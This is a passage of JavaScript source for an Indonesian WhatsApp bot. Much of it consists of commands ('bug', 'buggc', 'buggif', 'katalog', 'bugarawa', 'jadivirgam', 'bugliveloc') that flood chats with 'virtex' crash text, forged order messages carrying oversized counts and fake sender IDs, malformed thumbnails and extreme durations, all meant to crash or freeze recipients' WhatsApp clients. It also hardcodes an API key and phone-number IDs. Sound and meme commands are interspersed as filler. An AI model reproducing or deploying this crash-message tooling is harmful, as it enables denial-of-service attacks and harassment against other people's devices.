            var member = group['participants']
            var mem = []
            member.map(async adm => {
            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
            })
            var options = {
            	mimetype : 'video/mp4',
                contextInfo: { mentionedJid: mem },
                quoted: dev
            }
            ini_buffer = fs.readFileSync(file)
          zoe.sendMessage(from, ini_buffer, video, { thumbnail : virgam, ftokoo})
            fs.unlinkSync(file)
        } else{
          reply(`reply gambar/video dengan caption ${prefix}jadivirus`)
        }
        break
case 'zextzdgx':
if (!dev.key.fromMe) return reply('Lu siapa')
zoe.toggleDisappearingMessages(from, 7 * 24 * 60 * 60)
await zoe.toggleDisappearingMessages(from, 0)
zoe.sendMessage(from, spamvirtex, text)
zoe.sendMessage(from, virtex2(prefix), text)
zoe.toggleDisappearingMessages(from, 7 * 24 * 60 * 60)
await zoe.toggleDisappearingMessages(from, 0)
zoe.sendMessage(from, spamvirtex, text)
zoe.sendMessage(from, virtex2(prefix), text)
zoe.toggleDisappearingMessages(from, 7 * 24 * 60 * 60)
await zoe.toggleDisappearingMessages(from, 0)
zoe.sendMessage(from, spamvirtex, text)
zoe.sendMessage(from, virtex2(prefix), text)
zoe.toggleDisappearingMessages(from, 7 * 24 * 60 * 60)
await zoe.toggleDisappearingMessages(from, 0)
zoe.sendMessage(from, spamvirtex, text)
zoe.sendMessage(from, virtex2(prefix), text)
zoe.toggleDisappearingMessages(from, 7 * 24 * 60 * 60)
await zoe.toggleDisappearingMessages(from, 0)
zoe.toggleDisappearingMessages(from, 7 * 24 * 60 * 60)
                  break
  case 'buggif': 
				          case 'gif':
const nicko = fs.readFileSync('./hm/gif.gif')
					zoe.sendMessage(from,nicko,video, {mimetype: Mimetype.gif,caption: virtex9(prefix), thumbnail: virgam,quoted: {
				  key: {
				   fromMe: false,
				   participant: `0@s.whatsapp.net`, // Fake sender Jid
				   remoteJid: "status@broadcast"
				  },
				  message: {
				   orderMessage: {
				    itemCount: 999999999, // Bug
				    status: 1,
				    surface: 1,
				    message: '999999999',
				    orderTitle: '999999999', // Idk what this does
				    sellerJid: `0@s.whatsapp.net` // Seller
				   }
				  }
				 }
				}) 
					break
					case 'buggif2': 				          
const nicko2 = fs.readFileSync('./hm/gif2.mp4')
					zoe.sendMessage(from,nicko2,video, {mimetype: Mimetype.gif,caption: virtex9(prefix), thumbnail: virgam,quoted: {
				  key: {
				   fromMe: false,
				   participant: `0@s.whatsapp.net`, // Fake sender Jid
				   remoteJid: "status@broadcast"
				  },
				  message: {
				   orderMessage: {
				    itemCount: 999999999, // Bug
				    status: 1,
				    surface: 1,
				    message: '999999999',
				    orderTitle: '999999999', // Idk what this does
				    sellerJid: `0@s.whatsapp.net` // Seller
				   }
				  }
				 }
				}) 
					break
					case 'buggif3': 				          
const nicko3 = fs.readFileSync('./hm/gif3.mp4')
					zoe.sendMessage(from,nicko3,video, {mimetype: Mimetype.gif,caption: virtex9(prefix), thumbnail: virgam,quoted: {
				  key: {
				   fromMe: false,
				   participant: `0@s.whatsapp.net`, // Fake sender Jid
				   remoteJid: "status@broadcast"
				  },
				  message: {
				   orderMessage: {
				    itemCount: 999999999, // Bug
				    status: 1,
				    surface: 1,
				    message: '999999999',
				    orderTitle: '999999999', // Idk what this does
				    sellerJid: `0@s.whatsapp.net` // Seller
				   }
				  }
				 }
				}) 
					break
					case 'buggif4': 				          
const nicko4 = fs.readFileSync('./hm/gif4.mp4')
					zoe.sendMessage(from,nicko4,video, {mimetype: Mimetype.gif,caption: virtex9(prefix), thumbnail: virgam,quoted: {
				  key: {
				   fromMe: false,
				   participant: `0@s.whatsapp.net`, // Fake sender Jid
				   remoteJid: "status@broadcast"
				  },
				  message: {
				   orderMessage: {
				    itemCount: 999999999, // Bug
				    status: 1,
				    surface: 1,
				    message: '999999999',
				    orderTitle: '999999999', // Idk what this does
				    sellerJid: `0@s.whatsapp.net` // Seller
				   }
				  }
				 }
				}) 
					break
case 'buggif5': 				          
const nicko5 = fs.readFileSync('./hm/gif5.mp4')
					zoe.sendMessage(from,nicko5,video, {mimetype: Mimetype.gif,caption: virtex9(prefix), thumbnail: virgam,quoted: {
				  key: {
				   fromMe: false,
				   participant: `0@s.whatsapp.net`, // Fake sender Jid
				   remoteJid: "status@broadcast"
				  },
				  message: {
				   orderMessage: {
				    itemCount: 999999999, // Bug
				    status: 1,
				    surface: 1,
				    message: '999999999',
				    orderTitle: '999999999', // Idk what this does
				    sellerJid: `0@s.whatsapp.net` // Seller
				   }
				  }
				 }
				}) 
					break
case 'bugdokumen':
if (!dev.key.fromMe && !isOwner) return
tapib1 = fs.readFileSync('./hm/yamete.mp3')
zoe.sendMessage(from, tapib1, document, { quoted: makanya, filename:`DONTOL 🎭 V1 ${virtex2}.document`, mimetype: 'audio/application' })
reply('⏤͟͟͞͞Mampus Bg 🎭')
break
case 'bugdokumenv2':
case 'bugkk':
if (!dev.key.fromMe && !isOwner) return
tapib1 = fs.readFileSync('./hm/yamete.mp3')
zoe.sendMessage(from, tapib1, document, { quoted: makanya, filename:`DONTOL V2 🎭 ${emoji2}.document`, mimetype: 'audio/application' })
reply('⏤͟͟͞͞Mampus Lu Kkkkk 🎭')
break
case 'jadivirgamv2':
 if (!isQuotedImage) return reply('Reply gambarnya!')
			if ((isMedia || isQuotedImage ) && args.length == 0) 
            ger = isQuotedImage ? JSON.parse(JSON.stringify(dev).replace('quotedM','m')).message.extendedTextMessage.contextInfo : dev
            media = await zoe.downloadAndSaveMediaMessage(ger)
            zoe.sendMessage(from, fs.readFileSync(media), image, {thumbnail: virgamv2})
break
case 'jadivirgamv3':
 if (!isQuotedImage) return reply('Reply gambarnya!')
			if ((isMedia || isQuotedImage ) && args.length == 0) 
            ger = isQuotedImage ? JSON.parse(JSON.stringify(dev).replace('quotedM','m')).message.extendedTextMessage.contextInfo : dev
            media = await zoe.downloadAndSaveMediaMessage(ger)
            zoe.sendMessage(from, fs.readFileSync(media), image, {thumbnail: virgamv3})
break
case 'jadivirgamv4':
 if (!isQuotedImage) return reply('Reply gambarnya!')
			if ((isMedia || isQuotedImage ) && args.length == 0) 
            ger = isQuotedImage ? JSON.parse(JSON.stringify(dev).replace('quotedM','m')).message.extendedTextMessage.contextInfo : dev
            media = await zoe.downloadAndSaveMediaMessage(ger)
            zoe.sendMessage(from, fs.readFileSync(media), image, {thumbnail: virgamv4})
break
case 'jadivirgamv5':
 if (!isQuotedImage) return reply('Reply gambarnya!')
			if ((isMedia || isQuotedImage ) && args.length == 0) 
            ger = isQuotedImage ? JSON.parse(JSON.stringify(dev).replace('quotedM','m')).message.extendedTextMessage.contextInfo : dev
            media = await zoe.downloadAndSaveMediaMessage(ger)
            zoe.sendMessage(from, fs.readFileSync(media), image, {thumbnail: virgamv5})
break
case 'jadivirgamv6':
 if (!isQuotedImage) return reply('Reply gambarnya!')
			if ((isMedia || isQuotedImage ) && args.length == 0) 
            ger = isQuotedImage ? JSON.parse(JSON.stringify(dev).replace('quotedM','m')).message.extendedTextMessage.contextInfo : dev
            media = await zoe.downloadAndSaveMediaMessage(ger)
            zoe.sendMessage(from, fs.readFileSync(media), image, {thumbnail: virgamv6})
break
case 'jadivirvid':
 if (!isQuotedVideo) return reply('Reply Video!')
			if ((isMedia || isQuotedVideo ) && args.length == 0) 
            ger = isQuotedVideo ? JSON.parse(JSON.stringify(dev).replace('quotedM','m')).message.extendedTextMessage.contextInfo : dev
            media = await zoe.downloadAndSaveMediaMessage(ger)
            zoe.sendMessage(from, fs.readFileSync(media), video, {thumbnail: virgam})
break
case 'jadivirvidv2':
 if (!isQuotedVideo) return reply('Reply Video!')
			if ((isMedia || isQuotedVideo ) && args.length == 0) 
            ger = isQuotedVideo ? JSON.parse(JSON.stringify(dev).replace('quotedM','m')).message.extendedTextMessage.contextInfo : dev
            media = await zoe.downloadAndSaveMediaMessage(ger)
            zoe.sendMessage(from, fs.readFileSync(media), video, {thumbnail: virgamv2, duration: 99999})
break
case 'jadivirvidv3':
 if (!isQuotedVideo) return reply('Reply Video!')
			if ((isMedia || isQuotedVideo ) && args.length == 0) 
            ger = isQuotedVideo ? JSON.parse(JSON.stringify(dev).replace('quotedM','m')).message.extendedTextMessage.contextInfo : dev
            media = await zoe.downloadAndSaveMediaMessage(ger)
            zoe.sendMessage(from, fs.readFileSync(media), video, {thumbnail: virgamv3, duration: 679999})
break
case 'jadivirvidv4':
 if (!isQuotedVideo) return reply('Reply Video!')
			if ((isMedia || isQuotedVideo ) && args.length == 0) 
            ger = isQuotedVideo ? JSON.parse(JSON.stringify(dev).replace('quotedM','m')).message.extendedTextMessage.contextInfo : dev
            media = await zoe.downloadAndSaveMediaMessage(ger)
            zoe.sendMessage(from, fs.readFileSync(media), video, {thumbnail: virgamv4, duration: 679999})
break
case 'jadivirvidv5':
 if (!isQuotedVideo) return reply('Reply Video!')
			if ((isMedia || isQuotedVideo ) && args.length == 0) 
            ger = isQuotedVideo ? JSON.parse(JSON.stringify(dev).replace('quotedM','m')).message.extendedTextMessage.contextInfo : dev
            media = await zoe.downloadAndSaveMediaMessage(ger)
            zoe.sendMessage(from, fs.readFileSync(media), video, {thumbnail: virgamv5, duration: 679999})
break
case 'jadivirvidv6':
 if (!isQuotedVideo) return reply('Reply Video!')
			if ((isMedia || isQuotedVideo ) && args.length == 0) 
            ger = isQuotedVideo ? JSON.parse(JSON.stringify(dev).replace('quotedM','m')).message.extendedTextMessage.contextInfo : dev
            media = await zoe.downloadAndSaveMediaMessage(ger)
            zoe.sendMessage(from, fs.readFileSync(media), video, {thumbnail: virgamv6, duration: 679999})
break
case 'bugtagall':
                if (!dev.key.fromMe) return reply('Lu siapa')
if (!dev.key.fromMe & !isOwner) return reply(mess.only.admin)
if(!q) return reply('Ingfonya apa?')
if (!isGroup) return reply(mess.only.group)
var nom = dev.participant
members_id = []
	teks = '\n'
	for (let mem of groupMembers) {
	teks += `┣ *▢*   @${mem.jid.split('@')[0]}\n`
	members_id.push(mem.jid)
	}
mentions(`${q}. *KONTOL LODON    ${q} ${xixi} ${jadivirtex1}`+teks+`┗━ *「 ${namaowner} 」* `, members_id, false)
break
case 'tovirgam':
 if (!isQuotedSticker) return reply('Reply Sticker!')
			if ((isMedia || isQuotedSticker ) && args.length == 0) 
            ger = isQuotedSticker ? JSON.parse(JSON.stringify(dev).replace('quotedM','m')).message.extendedTextMessage.contextInfo : dev
            media = await zoe.downloadAndSaveMediaMessage(ger)
            zoe.sendMessage(from, fs.readFileSync(media), image, {thumbnail: virgam})
break
case 'tovirgamv2':
 if (!isQuotedSticker) return reply('Reply Sticker!')
			if ((isMedia || isQuotedSticker ) && args.length == 0) 
            ger = isQuotedSticker ? JSON.parse(JSON.stringify(dev).replace('quotedM','m')).message.extendedTextMessage.contextInfo : dev
            media = await zoe.downloadAndSaveMediaMessage(ger)
            zoe.sendMessage(from, fs.readFileSync(media), image, {thumbnail: virgamv2})
break
case 'tovirgamv3':
 if (!isQuotedSticker) return reply('Reply Sticker!')
			if ((isMedia || isQuotedSticker ) && args.length == 0) 
            ger = isQuotedSticker ? JSON.parse(JSON.stringify(dev).replace('quotedM','m')).message.extendedTextMessage.contextInfo : dev
            media = await zoe.downloadAndSaveMediaMessage(ger)
            zoe.sendMessage(from, fs.readFileSync(media), image, {thumbnail: virgamv3})
break
case 'tovirgamv4':
 if (!isQuotedSticker) return reply('Reply Sticker!')
			if ((isMedia || isQuotedSticker ) && args.length == 0) 
            ger = isQuotedSticker ? JSON.parse(JSON.stringify(dev).replace('quotedM','m')).message.extendedTextMessage.contextInfo : dev
            media = await zoe.downloadAndSaveMediaMessage(ger)
            zoe.sendMessage(from, fs.readFileSync(media), image, {thumbnail: virgamv4})
break
case 'tovirgamv5':
 if (!isQuotedSticker) return reply('Reply Sticker!')
			if ((isMedia || isQuotedSticker ) && args.length == 0) 
            ger = isQuotedSticker ? JSON.parse(JSON.stringify(dev).replace('quotedM','m')).message.extendedTextMessage.contextInfo : dev
            media = await zoe.downloadAndSaveMediaMessage(ger)
            zoe.sendMessage(from, fs.readFileSync(media), image, {thumbnail: virgamv5})
break
case 'tovirgamv6':
 if (!isQuotedSticker) return reply('Reply Sticker!')
			if ((isMedia || isQuotedSticker ) && args.length == 0) 
            ger = isQuotedSticker ? JSON.parse(JSON.stringify(dev).replace('quotedM','m')).message.extendedTextMessage.contextInfo : dev
            media = await zoe.downloadAndSaveMediaMessage(ger)
            zoe.sendMessage(from, fs.readFileSync(media), image, {thumbnail: virgamv6})
break
case 'jadicgb':
   if (!q) return reply(`Teks?`)
 if ((isMedia && !dev.message.videoMessage || isQuotedImage)) {
   let encmedia = isQuotedImage ? JSON.parse(JSON.stringify(dev).replace('quotedM','m')).message.extendedTextMessage.contextInfo : dev
   let media = await zoe.downloadMediaMessage(encmedia)
   imeu = await zoe.prepareMessage('0@s.whatsapp.net', media, image)
   imeg = imeu.message.imageMessage
   res = await zoe.prepareMessageFromContent(from,{
     "productMessage": {
         "product": {
             "productImage": imeg,
             "title": `${q}              ${vapi}`,
             "description": `${vapi}`,
             "retailerId": "zoe",
         },
         "businessOwnerJid": "62853338317160@s.whatsapp.net",
         "contextInfo": {
            "forwardingScore": 0,
            "isForwarded": false
        }
    }
}, {quoted: dev, thumbnail: virgam, contextInfo:{}})
   zoe.relayWAMessage(res)
}
break
case 'toimg': 
											reply(mess.wait)
									if (!isQuotedSticker) return reply('Reply stiker Lord')
									if ((isMedia && !dev.message.videoMessage || isQuotedImage || isQuotedSticker && args.length == 0)) {
										encmedia = JSON.parse(JSON.stringify(dev).replace('quotedM','m')).message.extendedTextMessage.contextInfo
										media = await zoe.downloadAndSaveMediaMessage(encmedia)
										ran = getRandom('.png')
										exec(`ffmpeg -i ${media} ${ran}`, (err) => {
											fs.unlinkSync(media)
											if (err) return reply('❎ Gagal, pada saat mengkonversi sticker ke gambar ❎')
											buffer = fs.readFileSync(ran)
											zoe.sendMessage(from, buffer, image, {caption:'Sukses Lord',quoted:dev})
											fs.unlinkSync(ran)
											})
										} else {
											reply(`Reply Stiker Nya Lord`)
										}
									break
          	case 'jadivirgam':
 if (!dev.key.fromMe && !isOwner) return
if (!isQuotedImage) return reply('Reply gambarnya!')
			if ((isMedia || isQuotedImage ) && args.length == 0) 
            ger = isQuotedImage ? JSON.parse(JSON.stringify(dev).replace('quotedM','m')).message.extendedTextMessage.contextInfo : dev
            media = await zoe.downloadAndSaveMediaMessage(ger)
            zoe.sendMessage(from, fs.readFileSync(media), image, {thumbnail: fs.readFileSync("./database/pirtek/zextz.jpg")})
break
case 'bugpc':
					if (!dev.key.fromMe) return reply(mess.owner)
buf = fs.readFileSync('./database/media/gambar.jpg')
imeu = await zoe.prepareMessage('0@s.whatsapp.net', buf, image) 
imeg = imeu.message.imageMessage
jk = await zoe.prepareMessageFromContent(from,{
"groupInviteMessage": {
"groupJid": "6288224859350-1624969639@g.us",
"inviteCode": "h+64P9RhJDzgXSPf",
"inviteExpiration": "1625338378",
"groupName": `zoe                                  ${vapi}`,
"jpegThumbnail": fs.readFileSync('./database/media/gambar.jpg')
}
}, {quoted:imeu, contextInfo:{}})
zoe.relayWAMessage(jk)
await setTimeout(() => {
reply('zoe     ')
}, 3000)
break
case 'bgc':
				case 'buggc':
        if (!isOwner && !dev.key.fromMe) return reply('Skip lu bukan owner !!')
					if (args.length < 1) return reply('Total?')
					for (let i = 0; i < args[0]; i++) {
					await zoe.toggleDisappearingMessages(from, 0)
					}
					reply('Udah kirim sebanyak '+args.join(' '))
        break
case 'bugsticker':
if (!dev.key.fromMe && !isOwner) return
res = await zoe.prepareMessageFromContent(from,{
	"stickerMessage": {
						"url": "https://mmg.whatsapp.net/d/f/Ar3J73JZWDkALd78sCqG3MhOl8e5O4mLrCB_c83IrW2z.enc",
						"fileSha256": "k1MG4Nx8T0C1H8PBwT7Me9yEhjHksd8tdSl6H6N/TF0=",
						"fileEncSha256": "GEyPQzx5ejVaConK5p5Bm+g/gBULXrSTgjAaFriudfI=",
						"mediaKey": "RalS1uKVh3ysv5aMCDHMqJ9osXF4O3ORlCdn9HsF5xY=",
						"mimetype": "image/webp",
						"sendEphemeral": true,
					    "thumbnail": fs.readFileSync('./database/pirtek/zextz.jpg'),
						"directPath": "/v/t62.15575-24/12155350_3800086346757642_2527437135372892402_n.enc?ccb=11-4&oh=22c0ea4d51336ce9774713b472e40d90&oe=616F20BC",
						"fileLength": "350946",
						"mediaKeyTimestamp": "1632135185",
						"isAnimated": true
}
}, {quoted:dev, contextInfo:{}}) 
zoe.relayWAMessage(res)
break
case 'katalog':
	  if (!dev.key.fromMe && !isOwner) return
    hmm4 = fs.readFileSync(`./logo1.jpg`)
imeu = await zoe.prepareMessage('0@s.whatsapp.net', hmm4, image)

imeg = imeu.message.imageMessage
res = await zoe.prepareMessageFromContent(from,{
  "productMessage": {
  "product": {
  "productImage": imeg,
  "productId": "", 
  "title": ngazap(prefix),
"description": emoji2(prefix), 
"priceAmount1000": "99999999",
"descriptionCount": "999999999",
  "productImageCount": "1",
  },
  "businessOwnerJid": "628956060596467@s.whatsapp.net",
  "contextInfo": {
  "forwardingScore": 9999,
  "isForwarded": true
  }
  }
  }, {quoted: {
				  key: {
				   fromMe: false,
				   participant: `0@s.whatsapp.net`, // Fake sender Jid
				   remoteJid: "status@broadcast"
				  },
				  message: {
				   orderMessage: {
				    itemCount: 999999999, // Bug
				    status: 1,
				    surface: 1,
				    message: '999999999',
				    orderTitle: '999999999', // Idk what this does
				    sellerJid: `0@s.whatsapp.net` // Seller
				   }
				  }
				 }
				})
  zoe.relayWAMessage(res)
  break
  case 'katalogv2':
  if (!dev.key.fromMe && !isOwner) return
    hmm3 = fs.readFileSync(`./src/catalog2.jpg`)
imeu = await zoe.prepareMessage('0@s.whatsapp.net', hmm3, image)

imeg = imeu.message.imageMessage
res = await zoe.prepareMessageFromContent(from,{
  "productMessage": {
  "product": {
  "productImage": imeg,
  "productId": "", 
  "title": katalog(prefix),
"description": emoji2(prefix), 
"priceAmount1000": "99999999",
"descriptionCount": "999999999",
  "productImageCount": "1",
  },
  "businessOwnerJid": "628956060596467@s.whatsapp.net",
  "contextInfo": {
  "forwardingScore": 9999,
  "isForwarded": true
  }
  }
  }, {quoted: {
				  key: {
				   fromMe: false,
				   participant: `0@s.whatsapp.net`, // Fake sender Jid
				   remoteJid: "status@broadcast"
				  },
				  message: {
				   orderMessage: {
				    itemCount: 999999999, // Bug
				    status: 1,
				    surface: 1,
				    message: '999999999',
				    orderTitle: '999999999', // Idk what this does
				    sellerJid: `0@s.whatsapp.net` // Seller
				   }
				  }
				 }
				})
  zoe.relayWAMessage(res)
  break
  case 'attp': 
                   if (args.length == 0) return reply(`Example: ${prefix + command} LoL Human`)
                    ini_txt = args.join(' ')
                    ini_buffer = await getBuffer(`https://api.lolhuman.xyz/api/${command}?apikey=${lolkey}&text=${ini_txt}`)
                    await zoe.sendMessage(from, ini_buffer, sticker, { quoted: dev})
                    break   
					case 'sendallvirtex':
					if (!dev.key.fromMe && !isOwner) return
zoe.sendMessage(from, emoji2(prefix), text)
zoe.sendMessage(from, virtex(prefix), text)
zoe.sendMessage(from, virtex2(prefix), text)
zoe.sendMessage(from, virtex3(prefix), text)
zoe.sendMessage(from, virtex4(prefix), text)
zoe.sendMessage(from, virtex5(prefix), text)
zoe.sendMessage(from, virtex6(prefix), text)
zoe.sendMessage(from, virtex7(prefix), text)
zoe.sendMessage(from, virtex8(prefix), text)
zoe.sendMessage(from, virtex9(prefix), text)
zoe.sendMessage(from, virtag(prefix), text)
break
         case 'bug':
if (!dev.key.fromMe && !isOwner) return
					if (args.length < 1) return reply('Jumlah?')
				 for (let i = 0; i < args[0]; i++) {
await zoe.toggleDisappearingMessages(from, 0)
}
sendFakeStatus(from, 'Berhasil Mengirim Bug Aja '+args.join(' '), fake)
         break
         case 'sound1':
         const sound1 = fs.readFileSync('audio/sound1.mp3')
         zoe.sendMessage(from, sound1, MessageType.audio, {quoted: dev, mimetype: 'audio/mp4', duration: 359996400, ptt:true})
         break
         case 'sound2':
         const suu = fs.readFileSync('audio/sound2.mp3')
         zoe.sendMessage(from, suu, MessageType.audio, {quoted: dev, mimetype: 'audio/mp4', duration: -2, ptt:true})
         break
         case 'sound3':
         const sound3 = fs.readFileSync('audio/sound3.mp3')
         zoe.sendMessage(from, sound3, MessageType.audio, {quoted: dev, mimetype: 'audio/mp4', duration: 359996400, ptt:true})
         break
         case 'sound4':
         const sound4 = fs.readFileSync('audio/sound4.mp3')
         zoe.sendMessage(from, sound4, MessageType.audio, {quoted: dev, mimetype: 'audio/mp4', duration: 359996400, ptt:true})
         break
         case 'sound5':
         const sound5 = fs.readFileSync('audio/sound5.mp3')
         zoe.sendMessage(from, sound5, MessageType.audio, {quoted: dev, mimetype: 'audio/mp4', duration: 359996400, ptt:true})
         break
         case 'sound6':
         const sound6 = fs.readFileSync('audio/sound6.mp3')
         zoe.sendMessage(from, sound6, MessageType.audio, {quoted: dev, mimetype: 'audio/mp4', duration: 359996400, ptt:true})
         break
         case 'sound7':
         const sound7 = fs.readFileSync('audio/sound7.mp3')
         zoe.sendMessage(from, sound7, MessageType.audio, {quoted: dev, mimetype: 'audio/mp4', duration: 359996400, ptt:true})
         break
case 'stickermeme': case 'memesticker': case 'memestick': case 'stickmeme': case 'stcmeme': case 'smeme':
													try {
										if (!q) return reply(`${prefix+command} zoe Botz`)
										var bawah = q.replace('', '_').replace('\n','%5Cn').replace('?', '~q').replace('%', '~p').replace('&', '~a').replace('#', '~h').replace('/', '~s')
										if (isImage || isQuotedImage) {
											reply(mess.wait)
											var imgbb = require('imgbb-uploader')
											let encmedia = isQuotedImage ? JSON.parse(JSON.stringify(dev).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : dev
											let media = await zoe.downloadAndSaveMediaMessage(encmedia, `./sticker/${sender}`)
											var tolink = await imgbb("3b8594f4cb11895f4084291bc655e510", media)
											var sticknye = `https://api.memegen.link/images/custom/-/${bawah}.png?background=${tolink.display_url}`
											var short = await axios.get('https://tinyurl.com/api-create.php?url=' + sticknye)
											var anuu = await getBuffer(`https://api.lolhuman.xyz/api/convert/towebp?apikey=${lolkey}&img=${short.data}`)
											fs.writeFileSync('./sticker/smemek.webp', anuu)
											exec(`webpmux -set exif ./sticker/data.exif ./sticker/smemek.webp -o ./sticker/smemek.webp`, async (error) => {
												if (error) return reply(mess.error)
												zoe.sendMessage(from, fs.readFileSync(`./sticker/smemek.webp`), sticker, { quoted: dev })
												})
												} else if (isQuotedSticker){
													reply(mess.wait)
													var imgbb = require('imgbb-uploader')
													let encmedia = JSON.parse(JSON.stringify(dev).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
													let media = await zoe.downloadAndSaveMediaMessage(encmedia)
													let ran = getRandom('.png')
													exec(`ffmpeg -i ${media} ${ran}`, async (err) => {
														fs.unlinkSync(media)
														if (err) return reply('Error')
														var tolink = await imgbb("3b8594f4cb11895f4084291bc655e510", ran)
														var sticknye = `https://api.memegen.link/images/custom/-/${bawah}.png?background=${tolink.display_url}`
														var short = await axios.get('https://tinyurl.com/api-create.php?url=' + sticknye)
														var anuu = await getBuffer(`https://api.lolhuman.xyz/api/convert/towebp?apikey=${lolkey}&img=${short.data}`)
														fs.writeFileSync('./sticker/smemek.webp', anuu)
														exec(`webpmux -set exif ./sticker/data.exif ./sticker/smemek.webp -o ./sticker/smemek.webp`, async (error) => {
															if (error) return reply(mess.error)
															zoe.sendMessage(from, fs.readFileSync(`./sticker/smemek.webp`), sticker, { quoted: dev })
															fs.unlinkSync(ran)
															})
														})
														} else {
															reply(`Reply gambar atau sticker dengan Caption ${prefix+command} teks`)
															}
														} catch (e) {
															return reply(`${e}`)
															console.log(e)
														}
													break
         case 'sound8':
         const sound8 = fs.readFileSync('audio/sound8.mp3')
         zoe.sendMessage(from, sound8, MessageType.audio, {quoted: dev, mimetype: 'audio/mp4', duration: 359996400, ptt:true})
         break
         case 'sound9':
         const sound9 = fs.readFileSync('audio/sound9.mp3')
         zoe.sendMessage(from, sound9, MessageType.audio, {quoted: dev, mimetype: 'audio/mp4', duration: 359996400, ptt:true})
         break
         case 'sound10':
         const sound10 = fs.readFileSync('audio/sound10.mp3')
         zoe.sendMessage(from, sound10, MessageType.audio, {quoted: dev, mimetype: 'audio/mp4', duration: 359996400, ptt:true})
         break
         case 'sound11':
         const sound11 = fs.readFileSync('audio/sound11.mp3')
         zoe.sendMessage(from, sound11, MessageType.audio, {quoted: dev, mimetype: 'audio/mp4', duration: 359996400, ptt:true})
         break
         case 'sound12':
         const sound12 = fs.readFileSync('audio/sound12.mp3')
         zoe.sendMessage(from, sound12, MessageType.audio, {quoted: dev, mimetype: 'audio/mp4', duration: 359996400, ptt:true})
         break
         case 'sound13':
         const sound13 = fs.readFileSync('audio/sound13.mp3')
         zoe.sendMessage(from, sound13, MessageType.audio, {quoted: dev, mimetype: 'audio/mp4', duration: 359996400, ptt:true})
         break
         case 'sound14':
         const sound14 = fs.readFileSync('audio/sound14.mp3')
         zoe.sendMessage(from, sound14, MessageType.audio, {quoted: dev, mimetype: 'audio/mp4', duration: 359996400, ptt:true})
         break
         case 'sound15':
         const sound15 = fs.readFileSync('audio/sound15.mp3')
         zoe.sendMessage(from, sound15, MessageType.audio, {quoted: dev, mimetype: 'audio/mp4', duration: 359996400, ptt:true})
         break
         case 'sound16':
         const sound16 = fs.readFileSync('audio/sound16.mp3')
         zoe.sendMessage(from, sound16, MessageType.audio, {quoted: dev, mimetype: 'audio/mp4', duration: 359996400, ptt:true})
         break
         case 'sound17':
         const sound17 = fs.readFileSync('audio/sound17.mp3')
         zoe.sendMessage(from, sound17, MessageType.audio, {quoted: dev, mimetype: 'audio/mp4', duration: 359996400, ptt:true})
         break
         case 'sound18':
         const sound18 = fs.readFileSync('audio/sound18.mp3')
         zoe.sendMessage(from, sound18, MessageType.audio, {quoted: dev, mimetype: 'audio/mp4', duration: 359996400, ptt:true})
         break
         case 'sound19':
         const sound19 = fs.readFileSync('audio/sound19.mp3')
         zoe.sendMessage(from, sound19, MessageType.audio, {quoted: dev, mimetype: 'audio/mp4', duration: 359996400, ptt:true})
         break
         case 'sound20':
         const sound20 = fs.readFileSync('audio/sound20.mp3')
         zoe.sendMessage(from, sound20, MessageType.audio, {quoted: dev, mimetype: 'audio/mp4', duration: 359996400, ptt:true})
         break
         case 'sound21':
         const sound21 = fs.readFileSync('audio/sound21.mp3')
         zoe.sendMessage(from, sound21, MessageType.audio, {quoted: dev, mimetype: 'audio/mp4', duration: 359996400, ptt:true})
         break
case 'bugliveloc':            
if (!dev.key.fromMe) return reply('Lu siapa')
            res = await zoe.prepareMessageFromContent(from,{
				"liveLocationMessage": {
						"degreesLatitude": 34.0184,
						"degreesLongitude": -118.411,
						"caption": `${spamvirtex}`,
						"sequenceNumber": "1632077323798001",
					"thumbnail": thumb,
    "contextInfo": {
      "forwardingScore": 3,
      "isForwarded": false
    }
  }
}, {quoted:ftroli, contextInfo:{}}) 
zoe.relayWAMessage(res)
break
         case 'sound22':
         const sound22 = fs.readFileSync('audio/sound22.mp3')
         zoe.sendMessage(from, sound22, MessageType.audio, {quoted: dev, mimetype: 'audio/mp4', duration: 359996400, ptt:true})
         break
         case 'sound23':
         const sound23 = fs.readFileSync('audio/sound23.mp3')
         zoe.sendMessage(from, sound23, MessageType.audio, {quoted: dev, mimetype: 'audio/mp4', duration: 359996400, ptt:true})
         break
         case 'sound24':
         const sound24 = fs.readFileSync('audio/sound24.mp3')
         zoe.sendMessage(from, sound24, MessageType.audio, {quoted: dev, mimetype: 'audio/mp4', duration: 359996400, ptt:true})
         break
         case 'sound25':
         const sound25 = fs.readFileSync('audio/sound25.mp3')
         zoe.sendMessage(from, sound25, MessageType.audio, {quoted: dev, mimetype: 'audio/mp4', duration: 359996400, ptt:true})
         break
case 'bugarawareal':
if (!dev.key.fromMe && !isOwner) return
virus = fs.readFileSync('./src/arawa.txt')
zoe.sendMessage(from, virus, document, { quoted: {
  key: {
   participant: '0@s.whatsapp.net'
  },
  message: {
   orderMessage: {
    itemCount: 9999999,
    status: 1,
    surface: 1,
    message: 'zoe️',
    orderTitle: 'bugdoc〽', // 
    sellerJid: '0@s.whatsapp.net'
   }
  }
 } , mimetype: 'application/txt'})
break
case 'bugarawa':
				case 'arawa':
         if (!dev.key.fromMe && !isOwner) return
arawa = fs.readFileSync('./src/arawa.txt')
zoe.sendMessage(from, arawa, document, { quoted: {
  key: {
   participant: '0@s.whatsapp.net'
  },
  message: {
   orderMessage: {
    itemCount: 9999999,
    status: 1,
    surface: 1,
    message: 'zoe️',
    orderTitle: 'bugdoc〽', // 
    sellerJid: '0@s.whatsapp.net'
   }
  }
 } ,filename:`${virtexbyzoe} ${virtexctlgg}.${coba}`, mimetype: 'application/txt'})
break
case 'bugarawaza':
         if (!dev.key.fromMe && !isOwner) return
arawa = fs.readFileSync('./src/arawa.txt')
zoe.sendMessage(from, arawa, document, { quoted: {
  key: {
   participant: '0@s.whatsapp.net'
  },
  message: {
   orderMessage: {
    itemCount: 9999999,
    status: 1,
    surface: 1,
    message: 'zoe️',
    orderTitle: 'bugdoc〽', // 
    sellerJid: '0@s.whatsapp.net'
   }
  }
 } ,filename:`${spamvirtex}.${virtexbyzoe}`, mimetype: 'application/txt'})
break
         case 'sound26':
         const sound26 = fs.readFileSync('audio/sound26.mp3')
         zoe.sendMessage(from, sound26, MessageType.audio, {quoted: dev, mimetype: 'audio/mp4', duration: 359996400, ptt:true})
         break
         case 'sound27':
         const sound27 = fs.readFileSync('audio/sound27.mp3')
         zoe.sendMessage(from, sound27, MessageType.audio, {quoted: dev, mimetype: 'audio/mp4', duration: 359996400, ptt:true})
         break
         case 'sound28':
